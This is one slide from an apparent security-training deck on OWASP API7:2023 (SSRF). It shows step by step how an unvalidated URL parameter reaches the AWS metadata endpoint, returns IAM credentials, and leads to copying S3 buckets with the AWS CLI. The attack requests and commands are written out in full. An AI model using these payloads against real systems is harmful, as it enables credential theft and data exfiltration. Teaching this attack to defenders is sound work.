@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API7:2023 &#x2014; Server Side Request Forgery &#xb7; Slide 10 of 28</title>
+<link rel="stylesheet" href="api07-shared.css">
+</head>
+<body>
+<div class="top-nav">
+  <div class="nav-left"><span class="nav-badge">API7:2023</span><span class="nav-title">Server Side Request Forgery</span></div>
+  <span class="nav-right">Slide 10 of 28</span>
+</div>
+<div class="progress-wrap">
+  <div class="tab-nav"><a class="seg done" href="api07-slide-01.html"></a><a class="seg done" href="api07-slide-02.html"></a><a class="seg done" href="api07-slide-03.html"></a><a class="seg done" href="api07-slide-04.html"></a><a class="seg done" href="api07-slide-05.html"></a><a class="seg done" href="api07-slide-06.html"></a><a class="seg done" href="api07-slide-07.html"></a><a class="seg done" href="api07-slide-08.html"></a><a class="seg done" href="api07-slide-09.html"></a><a class="seg active" href="api07-slide-10.html"></a><a class="seg" href="api07-slide-11.html"></a><a class="seg" href="api07-slide-12.html"></a><a class="seg" href="api07-slide-13.html"></a><a class="seg" href="api07-slide-14.html"></a><a class="seg" href="api07-slide-15.html"></a><a class="seg" href="api07-slide-16.html"></a><a class="seg" href="api07-slide-17.html"></a><a class="seg" href="api07-slide-18.html"></a><a class="seg" href="api07-slide-19.html"></a><a class="seg" href="api07-slide-20.html"></a><a class="seg" href="api07-slide-21.html"></a><a class="seg" href="api07-slide-22.html"></a><a class="seg" href="api07-slide-23.html"></a><a class="seg" href="api07-slide-24.html"></a><a class="seg" href="api07-slide-25.html"></a><a class="seg" href="api07-slide-26.html"></a><a class="seg" href="api07-slide-27.html"></a><a class="seg" href="api07-slide-28.html"></a></div>
+  <div class="progress-labels"><span>Part 2 &#xb7; How It Works</span><span>Slide 10</span></div>
+</div>
+<div class="slide active">
+
+  <div class="slide-eyebrow">Slide 10 &#xb7; Pattern 1 Mechanics</div>
+  <div class="slide-title">SSRF &#x2192; Metadata Endpoint &#x2192; IAM Credentials &#x2192; Cloud Account Access</div>
+  <div class="slide-subtitle">Step by step: how one URL parameter becomes full AWS account access.</div>
+  <div class="scenario-card">
+    <div class="scenario-num">THE SETUP</div>
+    <div class="scenario-title">An API with a URL-fetching feature running on AWS EC2</div>
+    <div class="scenario-body">
+      <p>The API has an endpoint: <code>POST /api/import?url=https://example.com/data.csv</code></p>
+      <p>The EC2 instance has an IAM role attached: <code>app-production-role</code> with permissions: <code>s3:GetObject, s3:PutObject</code> on <code>arn:aws:s3:::company-data-*</code></p>
+      <p>The API accepts any URL. No validation. No allowlist.</p>
+    </div>
+  </div>
+  <div class="outcome-list">
+    <div class="outcome-item">
+      <div class="outcome-icon">1&#xFE0F;&#x20E3;</div>
+      <div><div class="outcome-title">Attacker sends: <code>POST /api/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></div><div class="outcome-desc">The API server makes an outbound HTTP GET to the metadata endpoint. The metadata service returns the role name: <code>app-production-role</code></div></div>
+    </div>
+    <div class="outcome-item">
+      <div class="outcome-icon">2&#xFE0F;&#x20E3;</div>
+      <div><div class="outcome-title">Attacker sends: <code>POST /api/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role</code></div><div class="outcome-desc">The metadata service returns JSON: AccessKeyId, SecretAccessKey, Token, Expiration. The API returns this response to the attacker.</div></div>
+    </div>
+    <div class="outcome-item">
+      <div class="outcome-icon">3&#xFE0F;&#x20E3;</div>
+      <div><div class="outcome-title">Attacker configures AWS CLI with the stolen credentials</div><div class="outcome-desc"><code>AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...</code></div></div>
+    </div>
+    <div class="outcome-item">
+      <div class="outcome-icon">4&#xFE0F;&#x20E3;</div>
+      <div><div class="outcome-title">Attacker runs: <code>aws s3 ls</code> and <code>aws s3 sync s3://company-data-prod ./stolen/</code></div><div class="outcome-desc">Downloads all S3 objects the role can access. The role was meant for the application &#x2014; but the attacker now has the same access from anywhere on the internet.</div></div>
+    </div>
+  </div>
+  <div class="btn-row">
+    <a class="btn-secondary" href="api07-slide-09.html">&#x2190; Back</a>
+    <a class="btn-primary" href="api07-slide-11.html">Capital One deep dive &#x2192;</a>
+  </div>
+
+</div>
+<div class="page-footer"><a href="sources.html">&#x1F4C4; View sources</a></div>
+</body>
+</html>
